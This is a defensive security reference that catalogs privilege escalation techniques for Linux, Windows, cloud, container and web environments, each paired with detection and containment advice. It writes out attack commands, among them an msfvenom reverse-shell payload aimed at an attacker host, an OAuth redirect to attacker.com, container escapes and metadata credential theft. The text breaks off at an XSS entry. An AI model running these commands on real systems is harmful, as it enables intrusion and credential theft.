# Common Privilege Escalation Techniques

## Contents

- [Overview](#overview)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Cloud Environment Techniques](#cloud-environment-techniques)
- [Container/Orchestration Techniques](#containerorchestration-techniques)
- [Web Application Techniques](#web-application-techniques)
- [Exploitation Frameworks](#exploitation-frameworks)
- [Implementation Reference](#implementation-reference)
- [Available Functions](#available-functions)
- [Containment Strategies](#containment-strategies)
- [Best Practices & Security](#best-practices--security)
- [Related Documentation](#related-documentation)

## Overview

This reference document catalogs common privilege escalation techniques across multiple environments as a companion to the [Privilege Escalation Detection Guide](privilege_escalation_detection.md) and the [Privilege Escalation Response Playbook](../playbooks/privilege_escalation.md). Understanding these techniques helps security teams identify, detect, and mitigate privilege escalation attacks in the Cloud Infrastructure Platform.

Privilege escalation attacks occur when an attacker gains elevated access rights beyond those initially granted, potentially leading to unauthorized access to sensitive systems or data. This document focuses on the technical methods used for privilege escalation across different environments.

## Linux Privilege Escalation

### Kernel Exploits

1. **Local Kernel Vulnerabilities**
   - **Description**: Exploitation of kernel vulnerabilities to gain root privileges
   - **Common Vectors**: Unpatched kernel versions with known CVEs
   - **Example Exploits**: Dirty COW (CVE-2016-5195), overlayfs (CVE-2021-3493)
   - **MITRE ATT&CK**: T1068 (Exploitation for Privilege Escalation)
   - **Detection Method**: File integrity monitoring, process lineage analysis
   - **Containment Strategy**: Immediately apply kernel patches, isolate affected systems

2. **Vulnerable Kernel Modules**
   - **Description**: Leveraging flaws in loadable kernel modules
   - **Common Vectors**: Third-party modules, proprietary drivers
   - **Example Commands**:

     ```bash
     modinfo <module_name>     # Identify module information
     lsmod                     # List loaded modules
     insmod <malicious_module> # Load malicious module (attack)
     ```

   - **MITRE ATT&CK**: T1547.006 (Boot or Logon Autostart Execution: Kernel Modules)
   - **Detection Method**: Module loading monitoring, kernel integrity checks
   - **Containment Strategy**: Restrict module loading capabilities, blacklist malicious modules

### SUID/SGID Binary Abuse

1. **Exploitable SUID Binaries**
   - **Description**: Abusing SUID/SGID binaries to execute commands as root
   - **Common Vectors**: Misconfigured permissions, vulnerable versions
   - **Example Commands**:

     ```bash
     find / -perm -u=s -type f 2>/dev/null    # Find SUID binaries
     find / -perm -g=s -type f 2>/dev/null    # Find SGID binaries

     # Example of exploitation using vulnerable binary
     ./vulnerable_suid_binary 'payload command'
     ```

   - **MITRE ATT&CK**: T1548.001 (Setuid and Setgid)
   - **Detection Method**: Monitor execution of SUID binaries, track unusual argument patterns
   - **Containment Strategy**: Remove unnecessary SUID bits, restrict shell escape capabilities

2. **Custom SUID Binary Creation**
   - **Description**: Creation of new SUID binaries for persistence
   - **Common Vectors**: Writeable directories with elevated privileges
   - **Example Commands**:

     ```bash
     # Attack pattern
     gcc -o privesc privesc.c
     chmod u+s privesc
     ```

   - **MITRE ATT&CK**: T1548.001 (Setuid and Setgid)
   - **Detection Method**: File creation monitoring, permission change monitoring
   - **Containment Strategy**: Restrict SUID capability, monitor filesystem for permission changes

### Sudo Misconfigurations

1. **Sudo Rule Abuse**
   - **Description**: Exploiting overly permissive sudo rules
   - **Common Vectors**: Misconfigured sudoers entries, command wildcards
   - **Example Commands**:

     ```bash
     sudo -l                                  # List sudo permissions
     sudo program_allowed_in_sudoers -c 'id'  # Command injection via arguments
     ```

   - **MITRE ATT&CK**: T1548.003 (Sudo and Sudo Caching)
   - **Detection Method**: Sudo event logging, abnormal sudo executions
   - **Containment Strategy**: Implement least privilege sudo rules, restrict command arguments

2. **Sudo Token Exploitation**
   - **Description**: Abusing cached sudo credentials
   - **Common Vectors**: Default 15-minute sudo caching behavior
   - **Example Commands**:

     ```bash
     # Extending sudo token lifetime (attack)
     sudo -v

     # Finding sudo token file (attack)
     find /var/run/sudo -name "*$USER*"
     ```

   - **MITRE ATT&CK**: T1548.003 (Sudo and Sudo Caching)
   - **Detection Method**: Monitor suspicious sudo usage patterns
   - **Containment Strategy**: Reduce sudo timeout, implement MFA for privileged commands

### PATH Manipulation

1. **PATH Environment Abuse**
   - **Description**: Placing malicious executables in paths searched before system binaries
   - **Common Vectors**: Writable directories in PATH, insecure PATH configurations
   - **Example Commands**:

     ```bash
     # Adding current directory to PATH (potential vulnerability)
     export PATH=.:$PATH

     # Creating malicious version of command (attack)
     echo '#!/bin/bash' > /tmp/ls
     echo 'id' >> /tmp/ls
     chmod +x /tmp/ls
     export PATH=/tmp:$PATH
     ```

   - **MITRE ATT&CK**: T1574.007 (Path Interception by PATH Environment Variable)
   - **Detection Method**: PATH modification monitoring, unusual executable locations
   - **Containment Strategy**: Secure PATH environment settings, restrict writeable directories in PATH

2. **Relative Path Abuse**
   - **Description**: Exploiting scripts/programs that use relative paths
   - **Common Vectors**: Scripts without absolute paths, wildcards in commands
   - **Example Commands**:

     ```bash
     # Script vulnerability:
     # #!/bin/bash
     # cd /opt/app
     # ./binary_name      # Vulnerable relative path

     # Attack: Create malicious binary in working directory
     echo '#!/bin/bash' > binary_name
     echo 'id' >> binary_name
     chmod +x binary_name
     ```

   - **MITRE ATT&CK**: T1574 (Hijack Execution Flow)
   - **Detection Method**: File creation in unusual locations, script execution monitoring
   - **Containment Strategy**: Use absolute paths in scripts, restrict directory permissions

### Capabilities Abuse

1. **Linux Capabilities Exploitation**
   - **Description**: Abusing capabilities assigned to binaries
   - **Common Vectors**: Excessive capabilities granted to applications
   - **Example Commands**:

     ```bash
     getcap -r / 2>/dev/null                     # Find files with capabilities

     # Example of exploitation using cap_setuid capability
     ./binary_with_cap_setuid 'id'
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: Monitor capability usage, track binaries with dangerous capabilities
   - **Containment Strategy**: Restrict capabilities to minimum required, regular capability audits

2. **Capability Assignment**
   - **Description**: Unauthorized granting of capabilities to binaries
   - **Common Vectors**: Misconfigured file permissions, administrative access
   - **Example Commands**:

     ```bash
     # Attack pattern
     setcap cap_setuid+ep /path/to/binary
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: Monitor capability changes, file permission monitoring
   - **Containment Strategy**: Restrict capability assignment, implement file integrity monitoring

### Other Linux Techniques

1. **Cron Job Abuse**
   - **Description**: Modifying cron jobs to execute privileged commands
   - **Common Vectors**: Writable cron files, insecure script permissions
   - **Example Commands**:

     ```bash
     # Identifying cron jobs
     ls -la /etc/cron*

     # Adding malicious cron entry (attack)
     echo "* * * * * root chmod u+s /bin/bash" >> /etc/crontab
     ```

   - **MITRE ATT&CK**: T1053.003 (Scheduled Task/Job: Cron)
   - **Detection Method**: Cron file modification monitoring, unusual cron activities
   - **Containment Strategy**: Restrict cron file permissions, monitor for unauthorized changes

2. **Library Preloading**
   - **Description**: Using LD_PRELOAD to inject malicious code into privileged processes
   - **Common Vectors**: SUID binaries that don't sanitize environment, writable library paths
   - **Example Commands**:

     ```bash
     # Creating malicious shared object (attack)
     gcc -shared -fPIC -o /tmp/malicious.so /tmp/malicious.c

     # Using LD_PRELOAD to inject (attack)
     LD_PRELOAD=/tmp/malicious.so program
     ```

   - **MITRE ATT&CK**: T1574.006 (Dynamic Linker Hijacking)
   - **Detection Method**: Monitor LD_PRELOAD usage, track shared object loading
   - **Containment Strategy**: Configure SUID binaries to ignore LD_PRELOAD, restrict library paths

3. **NFS No_Root_Squash**
   - **Description**: Exploiting misconfigured NFS shares that don't squash root privileges
   - **Common Vectors**: NFS exports with no_root_squash option
   - **Example Commands**:

     ```bash
     # Finding vulnerable NFS shares
     showmount -e target

     # Mounting and exploiting (attack)
     mount -t nfs target:/share /mnt
     cp /bin/bash /mnt/backdoor
     chmod u+s /mnt/backdoor
     ```

   - **MITRE ATT&CK**: T1210 (Exploitation of Remote Services)
   - **Detection Method**: Monitor NFS mounts, track file permission changes on NFS shares
   - **Containment Strategy**: Remove no_root_squash option, restrict NFS access

## Windows Privilege Escalation

### Service Vulnerabilities

1. **Unquoted Service Paths**
   - **Description**: Exploiting services with spaces in unquoted paths
   - **Common Vectors**: Improperly configured service paths, writable directories in path
   - **Example Commands**:

     ```powershell
     # Finding unquoted service paths
     wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

     # Exploiting by placing malicious executable (attack)
     copy malicious.exe "C:\Program.exe"
     ```

   - **MITRE ATT&CK**: T1574.009 (Path Interception by Unquoted Path)
   - **Detection Method**: File creation monitoring, unusual service binary locations
   - **Containment Strategy**: Use quoted service paths, restrict directory permissions

2. **Insecure Service Permissions**
   - **Description**: Modifying service configurations due to weak permissions
   - **Common Vectors**: Overly permissive ACLs on services
   - **Example Commands**:

     ```powershell
     # Checking service permissions
     sc sdshow servicename

     # Modifying service configuration (attack)
     sc config servicename binPath= "C:\malicious.exe"
     ```

   - **MITRE ATT&CK**: T1574.011 (Services Registry Permissions Weakness)
   - **Detection Method**: Service configuration changes monitoring, permission change tracking
   - **Containment Strategy**: Apply least privilege to service ACLs, monitor for service changes

### UAC Bypass Techniques

1. **Auto-Elevation Process Abuse**
   - **Description**: Exploiting Windows applications that auto-elevate
   - **Common Vectors**: Applications with auto-elevation manifests
   - **Example Commands**:

     ```powershell
     # Identifying auto-elevate executables
     sigcheck -m C:\Windows\System32\*.exe | findstr /i "autoelevate"

     # Example of fodhelper bypass (attack)
     New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force
     ```

   - **MITRE ATT&CK**: T1548.002 (Bypass User Account Control)
   - **Detection Method**: Registry modifications monitoring, process lineage analysis
   - **Containment Strategy**: Set UAC to highest level, restrict registry write access

2. **DLL Hijacking for UAC Bypass**
   - **Description**: Placing malicious DLLs in the search path of privileged processes
   - **Common Vectors**: Applications that load DLLs without specifying full paths
   - **Example Commands**:

     ```powershell
     # Finding potential DLL hijacking targets
     Process Monitor -> Filter for "NAME NOT FOUND" + "PATH ENDS WITH .dll"

     # Creating malicious DLL (attack)
     copy malicious.dll C:\Windows\System32\missing.dll
     ```

   - **MITRE ATT&CK**: T1574.001 (DLL Search Order Hijacking)
   - **Detection Method**: Unexpected DLL loading, unusual file creation in system directories
   - **Containment Strategy**: Use full paths for DLLs, secure system directories

### Token Manipulation

1. **Token Impersonation**
   - **Description**: Stealing access tokens from other processes
   - **Common Vectors**: SYSTEM processes, accessible process tokens
   - **Example Commands**:

     ```powershell
     # Using Incognito (attack tool)
     incognito.exe list_tokens -u
     incognito.exe execute -c "DOMAIN\Administrator" cmd.exe
     ```

   - **MITRE ATT&CK**: T1134.001 (Token Impersonation/Theft)
   - **Detection Method**: Unexpected token usage, unusual process token attributes
   - **Containment Strategy**: Restrict token privileges, monitor for token manipulation

2. **Named Pipe Impersonation**
   - **Description**: Creating named pipes to steal tokens from connecting clients
   - **Common Vectors**: Services that connect to user-controlled named pipes
   - **Example PowerShell**:

     ```powershell
     # Creating a named pipe (attack)
     $pipe = New-Object System.IO.Pipes.NamedPipeServerStream("mypipe", [System.IO.Pipes.PipeDirection]::InOut)

     # Waiting for connection and impersonating
     $pipe.WaitForConnection()
     # Impersonation code follows
     ```

   - **MITRE ATT&CK**: T1134.002 (Create Process with Token)
   - **Detection Method**: Named pipe creation monitoring, unusual impersonation calls
   - **Containment Strategy**: Restrict named pipe creation, monitor for pipe connections

### Scheduled Task Abuse

1. **Task Scheduler Exploitation**
   - **Description**: Creating or modifying scheduled tasks to run with higher privileges
   - **Common Vectors**: Writeable task directories, misconfigured task permissions
   - **Example Commands**:

     ```powershell
     # Creating privileged scheduled task (attack)
     schtasks /create /tn "MyTask" /tr "C:\malicious.exe" /sc once /st 00:00 /ru "SYSTEM"

     # Checking for existing tasks
     schtasks /query /fo LIST /v
     ```

   - **MITRE ATT&CK**: T1053.005 (Scheduled Task)
   - **Detection Method**: Task creation monitoring, unusual scheduled task properties
   - **Containment Strategy**: Restrict task creation capabilities, monitor task changes

2. **AT Command Abuse**
   - **Description**: Using the AT command to schedule tasks running as SYSTEM
   - **Common Vectors**: Systems with AT service enabled
   - **Example Commands**:

     ```cmd
     # Creating privileged scheduled task (attack)
     at 13:30 /interactive cmd
     ```

   - **MITRE ATT&CK**: T1053.002 (At)
   - **Detection Method**: AT command execution monitoring
   - **Containment Strategy**: Disable AT service when not needed, restrict its usage

### Windows Registry Exploits

1. **AlwaysInstallElevated**
   - **Description**: Exploiting Windows Installer to run MSI packages with elevated privileges
   - **Common Vectors**: AlwaysInstallElevated policy enabled
   - **Example Commands**:

     ```powershell
     # Checking if enabled
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

     # Creating malicious MSI (attack)
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o malicious.msi
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: MSI installation monitoring, unusual MSI source locations
   - **Containment Strategy**: Disable AlwaysInstallElevated policy, restrict MSI installations

2. **Registry Run Keys**
   - **Description**: Using registry run keys for persistence with elevated privileges
   - **Common Vectors**: Writable registry locations, autorun entries
   - **Example Commands**:

     ```powershell
     # Adding run key (attack)
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malicious.exe"
     ```

   - **MITRE ATT&CK**: T1547.001 (Registry Run Keys / Startup Folder)
   - **Detection Method**: Registry modification monitoring, new autorun entries
   - **Containment Strategy**: Restrict registry write access, monitor autorun locations

### Other Windows Techniques

1. **DLL Search Order Hijacking**
   - **Description**: Placing malicious DLLs to be loaded by applications
   - **Common Vectors**: Applications that don't use absolute paths for DLLs
   - **Example Commands**:

     ```powershell
     # Finding potential targets
     Process Monitor -> Filter for "NAME NOT FOUND" + "PATH ENDS WITH .dll"

     # Creating malicious DLL (attack)
     copy malicious.dll C:\Path\To\Application\missing.dll
     ```

   - **MITRE ATT&CK**: T1574.001 (DLL Search Order Hijacking)
   - **Detection Method**: Unexpected DLL loading, unusual file creation in application directories
   - **Containment Strategy**: Use full paths for DLLs, secure application directories

2. **SeDebugPrivilege Abuse**
   - **Description**: Using debug privileges to access other processes' memory
   - **Common Vectors**: Accounts with SeDebugPrivilege enabled
   - **Example Code**:

     ```csharp
     // Enabling debug privilege (attack)
     public static void EnableDebugPrivilege()
     {
         IntPtr hToken;
         OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken);
         LUID luid;
         LookupPrivilegeValue(null, "SeDebugPrivilege", out luid);
         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
         tp.PrivilegeCount = 1;
         tp.Privileges = new LUID_AND_ATTRIBUTES[1];
         tp.Privileges[0].Luid = luid;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
         CloseHandle(hToken);
     }
     ```

   - **MITRE ATT&CK**: T1134 (Access Token Manipulation)
   - **Detection Method**: Privilege usage monitoring, process memory access tracking
   - **Containment Strategy**: Restrict debug privileges, monitor for privilege enabling

3. **WinRM/PowerShell Remoting**
   - **Description**: Abusing PowerShell remoting for lateral movement with elevated privileges
   - **Common Vectors**: Enabled WinRM service, misconfigured remoting permissions
   - **Example Commands**:

     ```powershell
     # Checking if WinRM is enabled
     Test-WSMan

     # Using PowerShell remoting (potential attack vector)
     Enter-PSSession -ComputerName target -Credential domain\admin
     ```

   - **MITRE ATT&CK**: T1021.006 (Remote Services: Windows Remote Management)
   - **Detection Method**: PowerShell remoting session monitoring, unusual remote connections
   - **Containment Strategy**: Restrict WinRM access, implement network segmentation

## Cloud Environment Techniques

### AWS Privilege Escalation

1. **IAM Permission Abuse**
   - **Description**: Exploiting excessive IAM permissions to escalate privileges
   - **Common Vectors**: Over-permissive policies, misconfigured role trust
   - **Example Commands**:

     ```bash
     # Listing current permissions (reconnaissance)
     aws iam get-user
     aws iam list-attached-user-policies --user-name target

     # Creating access key for another user (attack if allowed)
     aws iam create-access-key --user-name admin-user
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: CloudTrail monitoring, IAM activity analysis
   - **Containment Strategy**: Implement least privilege, enable CloudTrail, use IAM Access Analyzer

2. **Instance Metadata Service (IMDS) Exploitation**
   - **Description**: Accessing instance metadata to obtain IAM role credentials
   - **Common Vectors**: SSRF vulnerabilities, misconfigured applications
   - **Example Commands**:

     ```bash
     # Accessing instance role (attack via SSRF or compromised instance)
     curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
     ```

   - **MITRE ATT&CK**: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
   - **Detection Method**: Unusual metadata service access patterns, network monitoring
   - **Containment Strategy**: Implement IMDSv2, restrict metadata access, monitor for SSRF

3. **Lambda Function Permission Escalation**
   - **Description**: Exploiting Lambda execution roles with excessive permissions
   - **Common Vectors**: Overly permissive execution roles, vulnerable Lambda code
   - **Example Commands**:

     ```python
     # Example of Lambda function abusing its permissions (attack)
     import boto3

     def lambda_handler(event, context):
         iam = boto3.client('iam')
         # Create backdoor user if Lambda has iam:CreateUser permission
         response = iam.create_user(UserName='backdoor-user')
         # Attach admin policy if Lambda has iam:AttachUserPolicy permission
         iam.attach_user_policy(
             UserName='backdoor-user',
             PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
         )
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: CloudTrail analysis, Lambda execution monitoring
   - **Containment Strategy**: Implement least privilege for Lambda roles, restrict Lambda networking

### Azure Privilege Escalation

1. **Role Assignment Abuse**
   - **Description**: Exploiting permissions to assign privileged roles
   - **Common Vectors**: Microsoft.Authorization/roleAssignments/write permission
   - **Example Commands**:

     ```powershell
     # Getting current role assignments (reconnaissance)
     Get-AzRoleAssignment -SignInName current.user@domain.com

     # Assigning privileged role (attack if allowed)
     New-AzRoleAssignment -SignInName compromised@domain.com -RoleDefinitionName "Owner" -ResourceGroupName target
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: Azure Activity Log monitoring, role assignment auditing
   - **Containment Strategy**: Restrict role assignment capabilities, implement PIM, enable alerts

2. **Managed Identity Exploitation**
   - **Description**: Leveraging system or user-assigned managed identities
   - **Common Vectors**: Overly permissive managed identities, compromised VMs
   - **Example Commands**:

     ```bash
     # Accessing managed identity token from VM (legitimate or attack)
     curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H "Metadata: true"
     ```

   - **MITRE ATT&CK**: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
   - **Detection Method**: Unusual identity usage patterns, suspicious resource access
   - **Containment Strategy**: Apply least privilege to managed identities, restrict network access

3. **Azure Key Vault Access Abuse**
   - **Description**: Unauthorized access to secrets in Azure Key Vault
   - **Common Vectors**: Misconfigured access policies, overly permissive service principals
   - **Example Commands**:

     ```powershell
     # Listing key vault secrets (attack if unauthorized)
     Get-AzKeyVaultSecret -VaultName "target-keyvault"

     # Retrieving specific secret
     Get-AzKeyVaultSecret -VaultName "target-keyvault" -Name "admin-credentials" -AsPlainText
     ```

   - **MITRE ATT&CK**: T1552 (Unsecured Credentials)
   - **Detection Method**: Key Vault activity monitoring, unusual access patterns
   - **Containment Strategy**: Implement least privilege access policies, enable diagnostics logs

### GCP Privilege Escalation

1. **Service Account Key Abuse**
   - **Description**: Using service account keys to elevate privileges
   - **Common Vectors**: Misconfigured service accounts, exposed keys
   - **Example Commands**:

     ```bash
     # Activating service account (attack with stolen key)
     gcloud auth activate-service-account --key-file=stolen-key.json

     # Listing permissions after compromise
     gcloud projects get-iam-policy project-id
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: Audit logging, service account key usage monitoring
   - **Containment Strategy**: Key rotation, avoid long-lived keys, implement service account restrictions

2. **Custom Role Privilege Escalation**
   - **Description**: Creating or modifying IAM roles with excessive privileges
   - **Common Vectors**: resourcemanager.projects.setIamPolicy permission
   - **Example Commands**:

     ```bash
     # Creating privileged custom role (attack)
     gcloud iam roles create EscalatedRole --project=target-project --file=role-definition.yaml

     # Assigning the role to compromised account
     gcloud projects add-iam-policy-binding target-project --member="user:compromised@domain.com" --role="projects/target-project/roles/EscalatedRole"
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: IAM policy change monitoring, role creation auditing
   - **Containment Strategy**: Restrict role management permissions, implement least privilege

3. **Compute Instance Metadata Abuse**
   - **Description**: Accessing instance metadata to obtain service account credentials
   - **Common Vectors**: SSRF vulnerabilities, compromised instances
   - **Example Commands**:

     ```bash
     # Accessing service account token (attack)
     curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
     ```

   - **MITRE ATT&CK**: T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)
   - **Detection Method**: Unusual metadata API access, network monitoring
   - **Containment Strategy**: Custom metadata access controls, network segmentation, SSRF protection

## Container/Orchestration Techniques

### Docker Privilege Escalation

1. **Docker Socket Exposure**
   - **Description**: Accessing the Docker socket to escape container boundaries
   - **Common Vectors**: Mounted Docker socket, exposed API
   - **Example Commands**:

     ```bash
     # Checking for mounted socket (reconnaissance)
     ls -la /var/run/docker.sock

     # Escaping container via socket (attack)
     docker -H unix:///var/run/docker.sock run --rm -it --privileged --net=host --pid=host --ipc=host -v /:/host alpine chroot /host
     ```

   - **MITRE ATT&CK**: T1611 (Escape to Host)
   - **Detection Method**: Docker API calls monitoring, container escape detection
   - **Containment Strategy**: Avoid mounting Docker socket, implement least privilege

2. **Privileged Container Exploitation**
   - **Description**: Using privileged containers to access host resources
   - **Common Vectors**: Containers running with --privileged flag
   - **Example Commands**:

     ```bash
     # Checking if container is privileged (reconnaissance)
     cat /proc/self/status | grep CapEff

     # Mounting host filesystem (attack if privileged)
     mkdir /tmp/hostfs
     mount /dev/sda1 /tmp/hostfs
     ```

   - **MITRE ATT&CK**: T1611 (Escape to Host)
   - **Detection Method**: Container mount operations monitoring, privileged operations
   - **Containment Strategy**: Avoid privileged containers, restrict capabilities

3. **Container Capability Abuse**
   - **Description**: Exploiting excessive Linux capabilities granted to containers
   - **Common Vectors**: Containers with CAP_SYS_ADMIN and other dangerous capabilities
   - **Example Commands**:

     ```bash
     # Checking container capabilities (reconnaissance)
     capsh --print

     # Using SYS_ADMIN to mount host filesystem (attack)
     mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
     echo 1 > /tmp/cgrp/x/notify_on_release
     host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
     echo "$host_path/exploit" > /tmp/cgrp/release_agent
     touch /tmp/exploit
     chmod +x /tmp/exploit
     sh -c "echo '#!/bin/sh' > /tmp/exploit"
     sh -c "echo 'ps > $host_path/output' >> /tmp/exploit"
     ```

   - **MITRE ATT&CK**: T1611 (Escape to Host)
   - **Detection Method**: Unusual capability usage, mount namespace changes
   - **Containment Strategy**: Limit container capabilities, drop unnecessary capabilities

### Kubernetes Privilege Escalation

1. **Role-Based Access Control (RBAC) Abuse**
   - **Description**: Exploiting overly permissive RBAC policies
   - **Common Vectors**: Excessive permissions, wildcards in Role definitions
   - **Example Commands**:

     ```bash
     # Checking current permissions (reconnaissance)
     kubectl auth can-i --list

     # Creating privileged pod (attack if allowed)
     kubectl create -f privileged-pod.yaml
     ```

   - **MITRE ATT&CK**: T1078.004 (Valid Accounts: Cloud Accounts)
   - **Detection Method**: Kubernetes audit logging, unusual RBAC usage
   - **Containment Strategy**: Implement least privilege RBAC, avoid wildcards in roles

2. **Pod Security Context Exploitation**
   - **Description**: Deploying pods with privileged security contexts
   - **Common Vectors**: Allowed privileged containers, hostPath volumes
   - **Example YAML**:

     ```yaml
     # Privileged pod specification (attack)
     apiVersion: v1
     kind: Pod
     metadata:
       name: privileged-pod
     spec:
       containers:
       - name: shell
         image: alpine
         command: ["/bin/sh", "-c", "sleep 1000000"]
         securityContext:
           privileged: true
         volumeMounts:
         - mountPath: /host
           name: hostfs
       volumes:
       - name: hostfs
         hostPath:
           path: /
     ```

   - **MITRE ATT&CK**: T1611 (Escape to Host)
   - **Detection Method**: Pod creation monitoring, privileged container detection
   - **Containment Strategy**: Implement Pod Security Policies/Standards, restrict privileged containers

3. **Service Account Token Abuse**
   - **Description**: Using mounted service account tokens for privilege escalation
   - **Common Vectors**: Over-privileged service accounts, automatic token mounting
   - **Example Commands**:

     ```bash
     # Using service account token from within pod (attack)
     TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
     curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods/
     ```

   - **MITRE ATT&CK**: T1528 (Steal Application Access Token)
   - **Detection Method**: Unusual API server access, service account usage monitoring
   - **Containment Strategy**: Disable automountServiceAccountToken where unnecessary, restrict service account permissions

## Web Application Techniques

### Server-Side Techniques

1. **Insecure Direct Object References (IDOR)**
   - **Description**: Accessing resources by manipulating reference parameters
   - **Common Vectors**: URL parameters, API endpoints without proper authorization
   - **Example Request**:

     ```plaintext
     # Normal request
     GET /api/users/profile?id=123

     # Attack modifying user ID to access another user
     GET /api/users/profile?id=124
     ```

   - **MITRE ATT&CK**: T1213 (Data from Information Repositories)
   - **Detection Method**: Access pattern analysis, authorization failure monitoring
   - **Containment Strategy**: Implement proper access controls, validate user permissions for each request

2. **Vertical Privilege Escalation**
   - **Description**: Gaining access to functionality restricted to higher-privilege users
   - **Common Vectors**: Missing function-level authorization checks
   - **Example Request**:

     ```plaintext
     # Normal user request
     GET /api/users/profile

     # Attack accessing admin functionality
     GET /api/admin/users
     ```

   - **MITRE ATT&CK**: T1078 (Valid Accounts)
   - **Detection Method**: Unusual endpoint access, permission bypass attempts
   - **Containment Strategy**: Implement proper authorization for all endpoints, use role-based access control

3. **Remote Code Execution Leading to Privilege Escalation**
   - **Description**: Executing code on the server to gain higher privileges
   - **Common Vectors**: Injection vulnerabilities, insecure deserialization
   - **Example Commands**:

     ```plaintext
     # Example of PHP code injection
     POST /vulnerable.php HTTP/1.1

     param=<?php system('whoami'); ?>
     ```

   - **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
   - **Detection Method**: Command execution monitoring, process creation tracking
   - **Containment Strategy**: Input validation, output encoding, least privilege for application processes

### Authentication Bypasses

1. **JWT Token Manipulation**
   - **Description**: Modifying JSON Web Tokens to gain elevated privileges
   - **Common Vectors**: Unsigned tokens, weak signature validation
   - **Example**:

     ```plaintext
     # Original JWT with regular user role
     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIifQ.sLJLK_ITYQbvx8rYnFCzKrxCP3CmxJn8e5hzHEjnFu4

     # Modified JWT with admin role (if signature validation is bypassed)
     eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIn0.8D5jRBKEjC4XwMxkfJGfceYSQZIAWuZJONFYEy4JNAI
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: Token validation failures, unusual role changes
   - **Containment Strategy**: Strong token signing, proper validation, short expiration times

2. **Cookie Manipulation**
   - **Description**: Modifying cookies to alter security context
   - **Common Vectors**: Insecure cookie handling, client-side role storage
   - **Example**:

     ```plaintext
     # Original cookie
     role=user

     # Modified cookie (attack)
     role=admin
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: Cookie tampering detection, unusual role changes
   - **Containment Strategy**: Server-side session validation, signed/encrypted cookies

3. **OAuth Token Abuse**
   - **Description**: Manipulating OAuth flows to gain unauthorized access
   - **Common Vectors**: Misconfigured redirect URIs, token handling flaws
   - **Example**:

     ```plaintext
     # Legitimate OAuth flow
     GET /oauth/authorize?client_id=legitimate&redirect_uri=https://app.com/callback

     # Attack with modified redirect
     GET /oauth/authorize?client_id=legitimate&redirect_uri=https://attacker.com/steal
     ```

   - **MITRE ATT&CK**: T1528 (Steal Application Access Token)
   - **Detection Method**: Unusual redirect URIs, token usage monitoring
   - **Containment Strategy**: Strict redirect URI validation, short-lived tokens

### UI-Based Techniques

1. **Client-Side Security Control Bypasses**
   - **Description**: Manipulating client-side restrictions to access privileged features
   - **Common Vectors**: Hidden UI elements, client-side enforcement of permissions
   - **Example**:

     ```javascript
     // Enabling hidden admin features by modifying client-side variables
     document.getElementById('admin-panel').style.display = 'block';
     userRole = 'admin';
     ```

   - **MITRE ATT&CK**: T1548 (Abuse Elevation Control Mechanism)
   - **Detection Method**: Unusual feature access, unexpected client behavior
   - **Containment Strategy**: Server-side authorization checks, never trust client-side controls

2. **Cross-Site Request Forgery (CSRF)**
   - **Description**: Tricking users into performing privileged actions without consent
   - **Common Vectors**: Missing CSRF protections, session handling flaws
   - **Example HTML**:

     ```html
     <!-- Malicious page tricking admin user into creating new admin account -->
     <img src="https://target-app.com/api/users/create?username=attacker&role=admin" style="display:none">
     ```

   - **MITRE ATT&CK**: T1204 (User Execution)
   - **Detection Method**: Unusual request patterns, missing CSRF tokens
   - **Containment Strategy**: Implement CSRF tokens, use SameSite cookies, validate request origin

3. **Cross-Site Scripting (XSS) to Cookie Theft**
